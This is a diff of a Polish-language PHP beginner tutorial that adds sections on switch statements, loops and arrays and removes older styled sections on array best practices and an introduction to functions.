+    $ocena = "";
+    
+    switch (true) {
+        case ($punkty >= 90):
+            $ocena = "Celujący (6)";
+            break;
+        case ($punkty >= 75):
+            $ocena = "Bardzo dobry (5)";
+            break;
+        case ($punkty >= 60):
+            $ocena = "Dobry (4)";
+            break;
+        case ($punkty >= 50):
+            $ocena = "Dostateczny (3)";
+            break;
+        case ($punkty >= 40):
+            $ocena = "Dopuszczający (2)";
+            break;
+        default:
+            $ocena = "Niedostateczny (1)";
+    }
+    
+    echo "Zdobyłeś $punkty punktów - $ocena";
+?>
+```
+
+### **IF vs SWITCH - kiedy którego używać?**
+
+| Sytuacja | Użyj |
+|----------|------|
+| Sprawdzasz **jedną zmienną** na wiele **konkretnych wartości** | SWITCH |
+| Sprawdzasz **złożone warunki** (>, <, &&, \|\|) | IF |
+| Masz **zakres wartości** (np. wiek >= 18) | IF |
+| Porównujesz **różne zmienne** | IF |
+| Sprawdzasz **dokładną równość** wielu wartości | SWITCH |
+
+**Przykłady:**
+
+```php
+<?php
+    // DOBRZE - switch dla konkretnych wartości
+    switch ($rola) {
+        case "admin": /* ... */ break;
+        case "moderator": /* ... */ break;
+        case "user": /* ... */ break;
+    }
+    
+    // ŹLE - if byłby lepszy dla zakresów
+    switch (true) {
+        case ($wiek >= 18): /* ... */ break;  // Użyj IF!
+    }
+    
+    // DOBRZE - if dla złożonych warunków
+    if ($wiek >= 18 && $maKonto && $weryfikacja) {
+        // ...
+    }
+?>
+```
+
+---
+
+## **6. Pętle - powtarzanie kodu**
+
+Pętle pozwalają wykonywać ten sam kod wiele razy, zamiast pisać go wielokrotnie.
+
+### **Pętla WHILE - wykonuj dopóki warunek jest prawdziwy**
+
+```php
+<?php
+    $i = 1;
+    
+    while ($i <= 5) {
+        echo "Liczba: $i<br>";
+        $i++;  // WAŻNE! Zwiększamy licznik, inaczej pętla nigdy się nie skończy
+    }
+    
+    // Wynik:
+    // Liczba: 1
+    // Liczba: 2
+    // Liczba: 3
+    // Liczba: 4
+    // Liczba: 5
+?>
+```
+
+**Schemat działania:**
+```
+DOPÓKI warunek jest prawdziwy
+    wykonuj kod
+    (i zwiększaj/zmniejszaj licznik!)
+KONIEC
+```
+
+#### **UWAGA - nieskończona pętla (błąd!):**
+
+```php
+<?php
+    $i = 1;
+    
+    while ($i <= 5) {
+        echo "Liczba: $i<br>";
+        // Brak $i++; - pętla nigdy się nie skończy!
+    }
+?>
+```
+
+### **Pętla DO-WHILE - wykonaj przynajmniej raz**
+
+Różnica od `while`: kod wykona się przynajmniej raz, nawet jeśli warunek jest fałszywy:
+
+```php
+<?php
+    $i = 10;
+    
+    // Zwykły while - NIE wykona się
+    while ($i <= 5) {
+        echo "Nie wyświetli się";
+        $i++;
+    }
+    
+    // Do-while - wykona się raz
+    do {
+        echo "Wyświetli się raz: $i<br>";
+        $i++;
+    } while ($i <= 5);
+?>
+```
+
+### **Pętla FOR - gdy wiesz ile razy powtórzyć**
+
+Najczęściej używana pętla do określonej liczby powtórzeń:
+
+```php
+<?php
+    // for (start; warunek; krok)
+    for ($i = 1; $i <= 5; $i++) {
+        echo "Liczba: $i<br>";
+    }
+    
+    // Wynik:
+    // Liczba: 1
+    // Liczba: 2
+    // Liczba: 3
+    // Liczba: 4
+    // Liczba: 5
+?>
+```
+
+**Jak działa pętla FOR?**
+
+```
+1. $i = 1            (wykonuje się RAZ na początku)
+2. Sprawdź: $i <= 5  (jeśli true, wykonaj kod)
+3. Wykonaj kod w pętli
+4. $i++              (zwiększ licznik)
+5. Wróć do kroku 2
+```
+
+#### **Przykłady pętli FOR:**
+
+```php
+<?php
+    // Liczenie od 1 do 10
+    for ($i = 1; $i <= 10; $i++) {
+        echo "$i ";
+    }
+    // 1 2 3 4 5 6 7 8 9 10
+    
+    // Odliczanie w dół
+    for ($i = 10; $i > 0; $i--) {
+        echo "$i ";
+    }
+    echo "Start!";
+    // 10 9 8 7 6 5 4 3 2 1 Start!
+    
+    // Co druga liczba
+    for ($i = 0; $i <= 10; $i += 2) {
+        echo "$i ";
+    }
+    // 0 2 4 6 8 10
+    
+    // Niestandardowy krok
+    for ($i = 1; $i <= 100; $i *= 2) {
+        echo "$i ";
+    }
+    // 1 2 4 8 16 32 64
+?>
+```
+
+### **Pętla FOREACH - dla tablic**
+
+Specjalna pętla do przechodzenia przez wszystkie elementy tablicy:
+
+```php
+<?php
+    $owoce = ["jabłko", "banan", "gruszka", "pomarańcza"];
+    
+    // Sposób 1: tylko wartości
+    foreach ($owoce as $owoc) {
+        echo "Lubię $owoc<br>";
+    }
+    
+    // Wynik:
+    // Lubię jabłko
+    // Lubię banan
+    // Lubię gruszka
+    // Lubię pomarańcza
+    
+    // Sposób 2: indeks i wartość
+    foreach ($owoce as $indeks => $owoc) {
+        echo "$indeks: $owoc<br>";
+    }
+    
+    // Wynik:
+    // 0: jabłko
+    // 1: banan
+    // 2: gruszka
+    // 3: pomarańcza
+?>
+```
+
+#### **FOREACH dla tablic asocjacyjnych:**
+
+```php
+<?php
+    $osoba = [
+        "imie" => "Jan",
+        "nazwisko" => "Kowalski",
+        "wiek" => 25,
+        "miasto" => "Warszawa"
+    ];
+    
+    foreach ($osoba as $klucz => $wartosc) {
+        echo "$klucz: $wartosc<br>";
+    }
+    
+    // Wynik:
+    // imie: Jan
+    // nazwisko: Kowalski
+    // wiek: 25
+    // miasto: Warszawa
+?>
+```
+
+### **BREAK - przerwanie pętli**
+
+`break` natychmiast kończy pętlę:
+
+```php
+<?php
+    // Szukanie liczby
+    for ($i = 1; $i <= 10; $i++) {
+        if ($i == 5) {
+            echo "Znaleziono 5!";
+            break;  // Przerywa pętlę
+        }
+        echo "$i ";
+    }
+    
+    // Wyświetli: 1 2 3 4 Znaleziono 5!
+?>
+```
+
+#### **Praktyczny przykład - szukanie w tablicy:**
+
+```php
+<?php
+    $uczniowie = ["Anna", "Piotr", "Jan", "Maria", "Tomasz"];
+    $szukany = "Jan";
+    $znaleziono = false;
+    
+    foreach ($uczniowie as $indeks => $uczen) {
+        if ($uczen == $szukany) {
+            echo "Znaleziono $szukany na pozycji $indeks";
+            $znaleziono = true;
+            break;  // Nie trzeba szukać dalej
+        }
+    }
+    
+    if (!$znaleziono) {
+        echo "Nie znaleziono";
+    }
+?>
+```
+
+### **CONTINUE - pominięcie iteracji**
+
+`continue` pomija resztę kodu w aktualnej iteracji i przechodzi do następnej:
+
+```php
+<?php
+    // Wyświetl liczby parzyste
+    for ($i = 1; $i <= 10; $i++) {
+        if ($i % 2 != 0) {
+            continue;  // Pomija nieparzyste
+        }
+        echo "$i ";
+    }
+    
+    // Wyświetli: 2 4 6 8 10
+?>
+```
+
+#### **Praktyczny przykład - pomijanie pustych wartości:**
+
+```php
+<?php
+    $dane = ["Anna", "", "Piotr", null, "Jan", ""];
+    
+    foreach ($dane as $wartosc) {
+        if (empty($wartosc)) {
+            continue;  // Pomija puste wartości
+        }
+        echo "$wartosc<br>";
+    }
+    
+    // Wyświetli tylko:
+    // Anna
+    // Piotr
+    // Jan
+?>
+```
+
+### **Zagnieżdżone pętle**
+
+Pętle w pętlach:
+
+```php
+<?php
+    // Tabliczka mnożenia
+    for ($i = 1; $i <= 5; $i++) {
+        for ($j = 1; $j <= 5; $j++) {
+            $wynik = $i * $j;
+            echo "$i × $j = $wynik\t";
+        }
+        echo "<br>";
+    }
+    
+    // Rysowanie trójkąta
+    for ($i = 1; $i <= 5; $i++) {
+        for ($j = 1; $j <= $i; $j++) {
+            echo "*";
+        }
+        echo "<br>";
+    }
+    
+    // Wynik:
+    // *
+    // **
+    // ***
+    // ****
+    // *****
+?>
+```
+
+### **Porównanie pętli - kiedy której użyć?**
+
+| Pętla | Kiedy używać | Przykład |
+|-------|--------------|----------|
+| **while** | Gdy nie wiesz ile razy się wykona | Czytanie pliku linia po linii |
+| **do-while** | Gdy kod musi wykonać się przynajmniej raz | Menu - pokaż, dopóki użytkownik nie wybierze "wyjście" |
+| **for** | Gdy wiesz dokładnie ile razy powtórzyć | Liczenie od 1 do 10 |
+| **foreach** | Gdy przechodzisz przez tablicę | Wyświetlanie listy produktów |
+
+### **Praktyczne przykłady pętli**
+
+#### **Przykład 1: Suma liczb**
+
+```php
+<?php
+    $suma = 0;
+    
+    for ($i = 1; $i <= 100; $i++) {
+        $suma += $i;
+    }
+    
+    echo "Suma liczb od 1 do 100: $suma";  // 5050
+?>
+```
+
+#### **Przykład 2: Liczby pierwsze**
+
+```php
+<?php
+    echo "Liczby pierwsze od 2 do 50:<br>";
+    
+    for ($liczba = 2; $liczba <= 50; $liczba++) {
+        $jestPierwsza = true;
+        
+        for ($dzielnik = 2; $dzielnik < $liczba; $dzielnik++) {
+            if ($liczba % $dzielnik == 0) {
+                $jestPierwsza = false;
+                break;
+            }
+        }
+        
+        if ($jestPierwsza) {
+            echo "$liczba ";
+        }
+    }
+    
+    // Wyświetli: 2 3 5 7 11 13 17 19 23 29 31 37 41 43 47
+?>
+```
+
+#### **Przykład 3: Generowanie listy HTML**
+
+```php
+<?php
+    $produkty = [
+        ["nazwa" => "Laptop", "cena" => 2500],
+        ["nazwa" => "Mysz", "cena" => 50],
+        ["nazwa" => "Klawiatura", "cena" => 150],
+        ["nazwa" => "Monitor", "cena" => 800]
+    ];
+    
     echo "<ul>";
     foreach ($produkty as $produkt) {
         echo "<li>{$produkt['nazwa']} - {$produkt['cena']} zł</li>";
     }
     echo "</ul>";
-}
-
-// Kodowanie tablicy PHP z powrotem do JSON
-$nowe_dane = [
-    'produkty' => $dane['produkty'],
-    'statystyki' => [
-        'liczba_produktow' => count($dane['produkty']),
-        'liczba_kategorii' => count($grupy),
-        'srednia_cena_elektroniki' => $srednia_cena
-    ]
-];
-
-$json_output = json_encode($nowe_dane, JSON_PRETTY_PRINT);
-echo "<h3>Zaktualizowane dane JSON:</h3>";
-echo "<pre>" . htmlspecialchars($json_output) . "</pre>";
 ?>
 ```
 
-### Najlepsze praktyki pracy z tablicami
+---
 
-<div style="display: flex; flex-wrap: wrap; gap: 20px; margin: 20px 0;">
-    <div style="flex: 1; min-width: 300px; background-color: #E8F5E9; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-        <h4 style="color: #2E7D32; border-bottom: 1px solid #A5D6A7; padding-bottom: 8px; margin-top: 0;">✅ Co robić</h4>
-        <ul style="color: #333; margin-bottom: 0; padding-left: 20px; line-height: 1.5;">
-            <li>Używaj <code>[]</code> zamiast przestarzałej funkcji <code>array()</code></li>
-            <li>Stosuj opisowe nazwy kluczy w tablicach asocjacyjnych</li>
-            <li>Preferuj <code>foreach</code> do iteracji po tablicach</li>
-            <li>Sprawdzaj istnienie kluczy przez <code>isset()</code> lub <code>array_key_exists()</code></li>
-            <li>Używaj wbudowanych funkcji zamiast własnych pętli</li>
-            <li>Dokumentuj strukturę złożonych tablic wielowymiarowych</li>
-            <li>Używaj operatora <code>??</code> dla wartości domyślnych (PHP 7+)</li>
-            <li>Pamiętaj o użyciu <code>array_values()</code> po <code>unset()</code>, gdy potrzebujesz ciągłości indeksów</li>
-        </ul>
-    </div>
+## **7. Tablice - przechowywanie wielu danych**
+
+Tablica to zmienna, która może przechowywać wiele wartości jednocześnie.
+
+**Analogia:** Tablica jest jak szafa z szufladami:
+- **Szafa** = tablica
+- **Szuflady** = elementy tablicy
+- **Etykiety szuflad** = klucze/indeksy
+- **Zawartość szuflad** = wartości
+
+### **Tablica indeksowana (numerowana)**
+
+Elementy numerowane automatycznie od 0:
+
+```php
+<?php
+    // Sposób 1 - array()
+    $owoce = array("jabłko", "banan", "gruszka");
     
-  <div style="flex: 1; min-width: 300px; background-color: #FFEBEE; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-        <h4 style="color: #C62828; border-bottom: 1px solid #FFCDD2; padding-bottom: 8px; margin-top: 0;">❌ Czego unikać</h4>
-        <ul style="color: #333; margin-bottom: 0; padding-left: 20px; line-height: 1.5;">
-            <li>Zbyt głębokiego zagnieżdżania tablic (>3 poziomy)</li>
-            <li>Mieszania indeksów numerycznych i asocjacyjnych bez potrzeby</li>
-            <li>Używania pętli <code>for</code> dla tablic asocjacyjnych</li>
-            <li>Modyfikacji tablicy podczas iteracji (może prowadzić do błędów)</li>
-            <li>Tworzenia dużych tablic w pamięci bez potrzeby</li>
-            <li>Ponownego obliczania <code>count()</code> w każdej iteracji pętli</li>
-            <li>Niejednolitej struktury danych (różne klucze dla podobnych rekordów)</li>
-        </ul>
-    </div>
-</div>
-
-### Wydajność i optymalizacja tablic
-
-<div style="background-color: #FFEBEE; border-left: 5px solid #F44336; padding: 10px; margin-bottom: 20px;">
-<h4 style="margin-top: 0;">⚠️ Uwagi dotyczące wydajności</h4>
-<p style="color: #333333;">Tablice w PHP są potężne, ale przy niewłaściwym użyciu mogą wpłynąć na wydajność aplikacji:</p>
-
-<ul style="color: #333333;">
-  <li><strong>Duże tablice</strong> zużywają znaczną ilość pamięci</li>
-  <li><strong>Głębokie zagnieżdżenia</strong> spowalniają dostęp do danych</li>
-  <li><strong>Kopiowanie tablic</strong> jest kosztowne - używaj referencji gdy to możliwe</li>
-  <li><strong>Funkcja count()</strong> na dużych tablicach może być wolna - zapisuj wynik w zmiennej</li>
-</ul>
-</div>
-
-```php
-<?php
-// NIEOPTYMALNE - wyliczanie count() w każdej iteracji
-$duza_tablica = range(1, 10000);
-for ($i = 0; $i < count($duza_tablica); $i++) {
-    // operacje...
-}
-
-// OPTYMALNE - wyliczenie count() raz przed pętlą
-$duza_tablica = range(1, 10000);
-$ilosc = count($duza_tablica);
-for ($i = 0; $i < $ilosc; $i++) {
-    // operacje...
-}
-
-// NIEOPTYMALNE - kopiowanie dużej tablicy
-function zmien_dane($tablica) {
-    $tablica[0] = 100;  // zmiana dotyczy tylko lokalnej kopii
-    return $tablica;
-}
-
-// OPTYMALNE - użycie referencji
-function zmien_dane_referencyjnie(&$tablica) {
-    $tablica[0] = 100;  // zmiana oryginalnej tablicy
-}
-
-// Optymalne łączenie wielu tablic
-$wynik = array_merge(...$tablice);  // zamiast wielu wywołań array_merge()
-?>
-```
-
-### Wspólne błędy i jak ich unikać
-
-<div style="background-color: #FFF3CD; border-left: 5px solid #FFC107; padding: 10px; margin-bottom: 20px;">
-<h4 style="margin-top: 0;">⚠️ Typowe pułapki</h4>
-<p style="color: #333333;">Oto najczęstsze błędy podczas pracy z tablicami w PHP i jak ich unikać:</p>
-</div>
-
-#### 1. Problem z odwołaniem do nieistniejącego indeksu
-
-```php
-// Problem:
-$dane = ["nazwa" => "Produkt"];
-echo $dane["cena"]; // Warning: Undefined array key "cena"
-
-// Rozwiązanie:
-echo $dane["cena"] ?? "Cena nieustalona"; // Używaj operatora null coalescing
-// lub
-echo isset($dane["cena"]) ? $dane["cena"] : "Cena nieustalona";
-```
-
-#### 2. Problem z referencjami w foreach
-
-```php
-// Problem:
-$owoce = ["jabłko", "banan", "gruszka"];
-foreach ($owoce as &$owoc) {
-    $owoc = strtoupper($owoc);
-}
-// $owoc nadal istnieje jako referencja do ostatniego elementu!
-$owoc = "KIWI"; // Nieoczekiwanie zmienia ostatni element tablicy!
-
-// Rozwiązanie:
-foreach ($owoce as &$owoc) {
-    $owoc = strtoupper($owoc);
-}
-unset($owoc); // Zawsze usuwaj referencję po pętli foreach z &
-```
-
-#### 3. Problem z zagubionymi indeksami
-
-```php
-// Problem:
-$tablica = [10, 20, 30, 40, 50];
-unset($tablica[1]); // Usuwa 20
-unset($tablica[3]); // Usuwa 40
-// Teraz $tablica = [0 => 10, 2 => 30, 4 => 50] - brakujące indeksy!
-
-// Przy iteracji może być to mylące:
-foreach ($tablica as $klucz => $wartosc) {
-    echo "$klucz: $wartosc<br>";
-}
-
-// Rozwiązanie gdy potrzebujemy ciągłych indeksów:
-$tablica = array_values($tablica); // Reset indeksów
-// Teraz $tablica = [0 => 10, 1 => 30, 2 => 50]
-```
-
-<div style="background-color: #F1F8E9; border-left: 5px solid #8BC34A; padding: 15px; margin: 20px 0; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-<h4 style="margin-top: 0; color: #33691E;">📝 Najważniejsze wnioski</h4>
-
-<p style="color: #333333; line-height: 1.6;">Tablice to jedna z fundamentalnych struktur danych w PHP, które znacząco upraszczają zarządzanie zbiorami danych. Ich elastyczność i wszechstronność pozwala na:</p>
-
-<ul style="color: #333333; line-height: 1.6;">
-<li><strong>Efektywną organizację danych</strong> różnych typów w jednej strukturze</li>
-<li><strong>Łatwe przekształcanie i filtrowanie</strong> dużych zbiorów informacji</li>
-<li><strong>Reprezentację złożonych struktur</strong> dzięki zagnieżdżonym tablicom</li>
-<li><strong>Szybkie wyszukiwanie i dostęp</strong> do danych za pomocą kluczy</li>
-</ul>
-
-<p style="color: #333333; line-height: 1.6;">Umiejętność efektywnej pracy z tablicami jest niezbędna do tworzenia wydajnych i czytelnych aplikacji PHP. Pamiętaj o wykorzystaniu wbudowanych funkcji PHP, które często zapewniają najlepszą wydajność i czytelność kodu.</p>
-</div>
-
----
-
-# **8. Funkcje - Organizacja kodu**
-
-<div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.1); margin-bottom: 30px;">
-<h2 style="margin: 0; font-size: 24px; font-weight: 600;">🚀 Wprowadzenie do funkcji w PHP</h2>
-<p style="margin: 10px 0 0 0; font-size: 16px; opacity: 0.9;">Funkcje to nazwane bloki kodu, które wykonują określone zadanie i można je wywoływać wielokrotnie. Są fundamentalnym narzędziem organizacji kodu w PHP.</p>
-</div>
-
-## **Czym są funkcje?**
-
-<div style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 16px; border-radius: 10px; margin: 20px 0;">
-<p style="margin: 0; font-size: 15px;">💡 <strong>Analogia:</strong> Wyobraź sobie, że piszesz przepis na ciasto. Zamiast opisywać za każdym razem, jak ubić jajka, możesz stworzyć osobny „podprzepis" o nazwie „Ubij jajka" i używać go wielokrotnie. W programowaniu funkcje działają podobnie!</p>
-</div>
-
-**Funkcja** to nazwany blok kodu, który wykonuje określone zadanie i można go wywoływać, kiedy tylko potrzebujesz.
-
-### 🎯 **Funkcja to jak mały pomocnik, który:**
-
-<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin: 20px 0;">
-    <div style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; padding: 15px; border-radius: 10px; box-shadow: 0 4px 15px rgba(79, 172, 254, 0.3);">
-        <div style="font-size: 24px; margin-bottom: 8px;">⚡</div>
-        <h4 style="margin: 0 0 8px 0; font-size: 16px;">Wykonuje konkretną pracę</h4>
-        <p style="margin: 0; font-size: 14px; opacity: 0.9;">Oblicza coś lub wyświetla tekst</p>
-    </div>
+    // Sposób 2 - [] (nowocześniejszy, zalecany)
+    $owoce = ["jabłko", "banan", "gruszka"];
     
-<div style="background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%); color: white; padding: 15px; border-radius: 10px; box-shadow: 0 4px 15px rgba(67, 233, 123, 0.3);">
-    <div style="font-size: 24px; margin-bottom: 8px;">♻️</div>
-        <h4 style="margin: 0 0 8px 0; font-size: 16px;">Może być użyty wielokrotnie</h4>
-        <p style="margin: 0; font-size: 14px; opacity: 0.9;">W różnych miejscach programu</p>
-    </div>
+    // Dostęp do elementów (indeksy od 0!)
+    echo $owoce[0];  // jabłko
+    echo $owoce[1];  // banan
+    echo $owoce[2];  // gruszka
     
-<div style="background: linear-gradient(135deg, #fa709a 0%, #fee140 100%); color: white; padding: 15px; border-radius: 10px; box-shadow: 0 4px 15px rgba(250, 112, 154, 0.3);">
-        <div style="font-size: 24px; margin-bottom: 8px;">🧩</div>
-        <h4 style="margin: 0 0 8px 0; font-size: 16px;">Ułatwia organizację</h4>
-        <p style="margin: 0; font-size: 14px; opacity: 0.9;">Rozbija kod na mniejsze, łatwiejsze do zrozumienia części</p>
-    </div>
-</div>
-
----
-
-## **Dlaczego warto używać funkcji?**
-
-<div style="background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%); padding: 16px; border-radius: 10px; margin: 20px 0; color: #2d3436;">
-<p style="margin: 0; font-weight: 500;">🧱 <strong>Funkcje są jak klocki LEGO</strong> – pozwalają budować program z mniejszych, wielokrotnie używanych elementów.</p>
-</div>
-
-<div style="background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 8px 25px rgba(0,0,0,0.1); margin: 25px 0;">
-<table style="width: 100%; border-collapse: collapse;">
-  <thead>
-    <tr style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white;">
-      <th style="padding: 16px 20px; text-align: left; font-weight: 600; font-size: 16px;">Korzyść</th>
-      <th style="padding: 16px 20px; text-align: left; font-weight: 600; font-size: 16px;">Opis</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 16px 20px; font-weight: 600; color: #e74c3c;">🔁 Eliminują powtarzanie kodu</td>
-      <td style="padding: 16px 20px; color: #555;">Zamiast pisać ten sam kod kilka razy, piszesz go raz w funkcji i wywołujesz, kiedy potrzebujesz</td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 16px 20px; font-weight: 600; color: #9b59b6;">🧩 Ułatwiają organizację</td>
-      <td style="padding: 16px 20px; color: #555;">Duży program dzielisz na mniejsze, czytelne fragmenty</td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 16px 20px; font-weight: 600; color: #3498db;">🧪 Łatwo testować</td>
-      <td style="padding: 16px 20px; color: #555;">Możesz sprawdzić, czy funkcja działa poprawnie, nie martwiąc się o resztę programu</td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 16px 20px; font-weight: 600; color: #27ae60;">♻️ Ponowne wykorzystanie</td>
-      <td style="padding: 16px 20px; color: #555;">Funkcje można używać w różnych projektach, oszczędzając czas</td>
-    </tr>
-    <tr>
-      <td style="padding: 16px 20px; font-weight: 600; color: #f39c12;">📖 Czytelność kodu</td>
-      <td style="padding: 16px 20px; color: #555;">Kod staje się bardziej zrozumiały, bo nazwy funkcji opisują, co robią</td>
-    </tr>
-  </tbody>
-</table>
-</div>
-
----
-
-## **Jak stworzyć i używać funkcję?**
-
-Funkcje w PHP definiuje się za pomocą słowa kluczowego `function`, a następnie wywołuje się je po nazwie. Oto prosty przykład, który wyświetla powitanie:
-
-<div style="background: #2d3748; border-radius: 10px; padding: 20px; margin: 20px 0; position: relative; overflow: hidden;">
-<div style="position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #cbd5e0;">PHP</div>
-
-```php
-<?php
-// Definiowanie funkcji
-function powitaj() {
-    echo "Cześć, witaj w PHP!";
-}
-
-// Wywoływanie funkcji
-powitaj(); // Wyświetli: Cześć, witaj w PHP!
+    // Zmiana wartości
+    $owoce[1] = "pomarańcza";
+    echo $owoce[1];  // pomarańcza
+    
+    // Dodawanie elementu na końcu
+    $owoce[] = "śliwka";
+    echo $owoce[3];  // śliwka
 ?>
 ```
 
-</div>
+**WAŻNE:** Tablice w PHP (i większości języków programowania) zaczynają się od indeksu **0**, nie 1!
 
-<div style="background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%); border-left: 5px solid #2196f3; padding: 20px; border-radius: 10px; margin: 25px 0;">
-<h4 style="margin-top: 0; color: #1565c0; display: flex; align-items: center; gap: 8px;"><span style="font-size: 20px;">🧠</span> Analogia z przepisem kulinarnym</h4>
-<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 15px;">
-<div style="background: white; padding: 12px; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
-<strong style="color: #1976d2;">Nazwa funkcji</strong> (<code style="background: #f5f5f5; padding: 2px 4px; border-radius: 3px;">powitaj</code>)<br>
-<span style="color: #666; font-size: 14px;">→ nazwa przepisu</span>
-</div>
-<div style="background: white; padding: 12px; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
-<strong style="color: #1976d2;">Ciało funkcji</strong> (kod w <code style="background: #f5f5f5; padding: 2px 4px; border-radius: 3px;">{}</code>)<br>
-<span style="color: #666; font-size: 14px;">→ instrukcje wykonania</span>
-</div>
-<div style="background: white; padding: 12px; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
-<strong style="color: #1976d2;">Wywołanie funkcji</strong> (<code style="background: #f5f5f5; padding: 2px 4px; border-radius: 3px;">powitaj()</code>)<br>
-<span style="color: #666; font-size: 14px;">→ moment użycia przepisu</span>
-</div>
-</div>
-</div>
+```
+Indeks:    0         1        2
+Wartość: [jabłko] [banan] [gruszka]
+```
 
----
+### **Tablica asocjacyjna (z nazwanymi kluczami)**
 
-## **Anatomia funkcji**
-
-<div style="background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 8px 25px rgba(0,0,0,0.1); margin: 25px 0;">
-<div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 16px 20px;">
-<h3 style="margin: 0; font-size: 18px;">🔍 Elementy funkcji</h3>
-</div>
-<table style="width: 100%; border-collapse: collapse;">
-  <thead>
-    <tr style="background: #f8f9fa;">
-      <th style="padding: 16px 20px; text-align: left; color: #495057; font-weight: 600;">Element</th>
-      <th style="padding: 16px 20px; text-align: left; color: #495057; font-weight: 600;">Opis</th>
-      <th style="padding: 16px 20px; text-align: left; color: #495057; font-weight: 600;">Przykład</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 16px 20px;"><code style="background: #e9ecef; padding: 4px 8px; border-radius: 4px; color: #d63384;">function</code></td>
-      <td style="padding: 16px 20px; color: #555;">Słowo kluczowe rozpoczynające definicję</td>
-      <td style="padding: 16px 20px;"><code style="background: #f8f9fa; padding: 4px 8px; border-radius: 4px;">function</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 16px 20px; font-weight: 600; color: #6f42c1;">Nazwa funkcji</td>
-      <td style="padding: 16px 20px; color: #555;">Opisowa nazwa funkcji</td>
-      <td style="padding: 16px 20px;"><code style="background: #f8f9fa; padding: 4px 8px; border-radius: 4px;">obliczCeneBrutto</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 16px 20px; font-weight: 600; color: #20c997;">Parametry</td>
-      <td style="padding: 16px 20px; color: #555;">Dane wejściowe w nawiasach <code>()</code></td>
-      <td style="padding: 16px 20px;"><code style="background: #f8f9fa; padding: 4px 8px; border-radius: 4px;">($cena, $vat)</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 16px 20px; font-weight: 600; color: #fd7e14;">Ciało funkcji</td>
-      <td style="padding: 16px 20px; color: #555;">Kod wykonawczy w nawiasach <code>{}</code></td>
-      <td style="padding: 16px 20px;"><code style="background: #f8f9fa; padding: 4px 8px; border-radius: 4px;">{ return $cena * 1.23; }</code></td>
-    </tr>
-    <tr>
-      <td style="padding: 16px 20px;"><code style="background: #e9ecef; padding: 4px 8px; border-radius: 4px; color: #d63384;">return</code></td>
-      <td style="padding: 16px 20px; color: #555;">Zwraca wynik (opcjonalne)</td>
-      <td style="padding: 16px 20px;"><code style="background: #f8f9fa; padding: 4px 8px; border-radius: 4px;">return $wynik;</code></td>
-    </tr>
-  </tbody>
-</table>
-</div>
-
-### 📝 Przykład z return:
-
-<div style="background: #2d3748; border-radius: 10px; padding: 20px; margin: 20px 0; position: relative;">
-<div style="position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #cbd5e0;">PHP</div>
+Elementy mają własne nazwy (klucze):
 
 ```php
 <?php
-function dodajLiczby() {
-    $suma = 5 + 10;
-    return $suma; // Zwraca wynik
-}
-
-$wynik = dodajLiczby(); // Zapisujemy wynik do zmiennej
-echo "Wynik dodawania: $wynik"; // Wyświetli: Wynik dodawania: 15
+    $osoba = [
+        "imie" => "Jan",
+        "nazwisko" => "Kowalski",
+        "wiek" => 25,
+        "miasto" => "Warszawa",
+        "email" => "jan@example.com"
+    ];
+    
+    // Dostęp do elementów
+    echo $osoba["imie"];      // Jan
+    echo $osoba["wiek"];      // 25
+    echo $osoba["email"];     // jan@example.com
+    
+    // Zmiana wartości
+    $osoba["wiek"] = 26;
+    
+    // Dodawanie nowego elementu
+    $osoba["telefon"] = "123456789";
 ?>
 ```
 
-</div>
+**Wizualizacja:**
+```
+Klucz        =>  Wartość
+"imie"       =>  "Jan"
+"nazwisko"   =>  "Kowalski"
+"wiek"       =>  25
+"miasto"     =>  "Warszawa"
+```
 
----
-
-## **Funkcje z parametrami – dane na wejściu**
-
-<div style="background: linear-gradient(135deg, #ffeaa7 0%, #fdcb6e 100%); padding: 16px; border-radius: 10px; margin: 20px 0; color: #2d3436;">
-<p style="margin: 0; font-weight: 500;">📊 <strong>Parametry</strong> to dane, które przekazujemy do funkcji. To jak podanie składników do przepisu – funkcja „przetwarza" je i daje wynik.</p>
-</div>
-
-### 🎯 Jeden parametr:
-
-<div style="background: #2d3748; border-radius: 10px; padding: 20px; margin: 20px 0; position: relative;">
-<div style="position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #cbd5e0;">PHP</div>
+### **Tablica wielowymiarowa (tablica w tablicy)**
 
